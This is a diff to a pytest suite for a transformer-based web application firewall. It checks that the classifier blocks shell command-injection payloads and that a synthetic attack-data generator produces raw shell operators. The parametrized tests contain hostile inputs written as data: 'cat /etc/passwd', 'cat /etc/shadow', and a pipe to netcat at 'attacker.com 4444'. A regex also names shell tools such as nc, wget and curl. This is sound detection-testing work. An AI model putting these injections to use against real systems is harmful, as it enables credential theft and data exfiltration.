@@ -240,28 +240,44 @@ def transformer_classifier_prod_threshold():
 
 
 @needs_distilbert
+@pytest.mark.parametrize(
+    "payload",
+    [
+        # Fixed by the commix retrain (2026-07-31 follow-up) — semicolon
+        # separator now correctly predicts command_injection at high
+        # confidence even at production's threshold.
+        "host=127.0.0.1; cat /etc/passwd",
+    ],
+)
+def test_transformer_blocks_raw_command_injection(transformer_classifier_prod_threshold, payload):
+    p = transformer_classifier_prod_threshold.predict(payload)
+    assert p.blocked is True
+
+
+@needs_distilbert
 @pytest.mark.xfail(
-    reason="REGRESSION introduced by the synth-forms retrain, confirmed at "
-    "production's actual WAF_THRESHOLD=0.8: command_injection was already the "
-    "thinnest class (61 held-out samples, weakest P/R in the taxonomy) and "
-    "growing clean+synth further diluted its decision boundary. Root cause: "
-    "the SecLists commix payload source (8262 samples, added 2026-07-31) is "
-    "100% percent-encoded (%3B, %7C, ...) — it adds volume but not "
-    "raw-separator diversity, so literal `;`/`|` next to a plain command "
-    "stays out-of-distribution. Needs raw (unencoded) command_injection "
-    "samples specifically, not more encoded ones.",
+    reason="NEW regression from the same commix retrain, worse than before: "
+    "these now predict 'clean' at high confidence (up to 0.994) instead of "
+    "merely the wrong attack class — a real false-negative on live attack "
+    "traffic. Root cause: synth_benign.py's form generator uses the SAME "
+    "form-key vocabulary (host/ip/file/...) joined by '&', and the model "
+    "leaned on that shape as a benign signal instead of the operator+command "
+    "riding along with it. commix's data is percent-encoded only so it never "
+    "taught the raw '&&'/'|' cases. Needs ml.waf.synth_cmdi's raw-operator "
+    "corpus (built 2026-07-31, not yet retrained on) to close this.",
     strict=True,
 )
 @pytest.mark.parametrize(
     "payload",
     [
-        "host=127.0.0.1; cat /etc/passwd",
         "ip=8.8.8.8; whoami",
         "input=$(whoami)",
         "file=test.txt | nc attacker.com 4444",
+        "cmd=ping 8.8.8.8 && cat /etc/shadow",
+        "name=test; ls -la",
     ],
 )
-def test_transformer_blocks_raw_command_injection(transformer_classifier_prod_threshold, payload):
+def test_transformer_blocks_operator_command_injection(transformer_classifier_prod_threshold, payload):
     p = transformer_classifier_prod_threshold.predict(payload)
     assert p.blocked is True
 
@@ -328,3 +344,58 @@ def test_synth_no_attack_pattern_leakage():
     recs = synth_benign.generate(2000, seed=1)
     leaked = [r["text"] for r in recs if _ATTACK_LEAK_RE.search(r["text"])]
     assert not leaked, f"synthetic benign data leaked attack-like patterns: {leaked[:5]}"
+
+
+# --- synthetic raw command-injection (the regression-fix generator) --------
+from ml.waf import synth_cmdi  # noqa: E402
+
+_OPERATOR_RE = re.compile(r"(;|\&\&|\|\||\||`|\$\()")
+_REAL_COMMAND_RE = re.compile(
+    r"\b(cat|whoami|id|ls|nc|wget|curl|rm|ping|uname|bash|sh)\b", re.IGNORECASE
+)
+
+
+def test_cmdi_generates_requested_count():
+    recs = synth_cmdi.generate(200, seed=1)
+    assert len(recs) == 200
+
+
+def test_cmdi_all_records_labeled_command_injection():
+    recs = synth_cmdi.generate(200, seed=1)
+    assert all(r["label"] == "command_injection" for r in recs)
+
+
+def test_cmdi_deterministic_with_seed():
+    a = synth_cmdi.generate(50, seed=7)
+    b = synth_cmdi.generate(50, seed=7)
+    assert [r["text"] for r in a] == [r["text"] for r in b]
+
+
+def test_cmdi_every_sample_has_raw_operator():
+    recs = synth_cmdi.generate(300, seed=1)
+    missing = [r["text"] for r in recs if not _OPERATOR_RE.search(r["text"])]
+    assert not missing, f"samples missing a raw shell operator: {missing[:5]}"
+
+
+def test_cmdi_every_sample_has_real_command():
+    recs = synth_cmdi.generate(300, seed=1)
+    missing = [r["text"] for r in recs if not _REAL_COMMAND_RE.search(r["text"])]
+    assert not missing, f"samples missing a real command: {missing[:5]}"
+
+
+def test_cmdi_uses_form_like_key_prefix():
+    # This is the exact regression shape: key=value combined with an operator,
+    # not a bare payload — form-key noise is what confused the model.
+    recs = synth_cmdi.generate(300, seed=1)
+    with_key = [r for r in recs if re.match(r"^[a-zA-Z_]+=", r["text"])]
+    assert len(with_key) == len(recs)
+
+
+def test_cmdi_operator_diversity():
+    recs = synth_cmdi.generate(1000, seed=1)
+    ops_seen = set()
+    for r in recs:
+        for op in [";", "&&", "||", "|", "`", "$("]:
+            if op in r["text"]:
+                ops_seen.add(op)
+    assert len(ops_seen) >= 4, f"operator diversity too low: {ops_seen}"
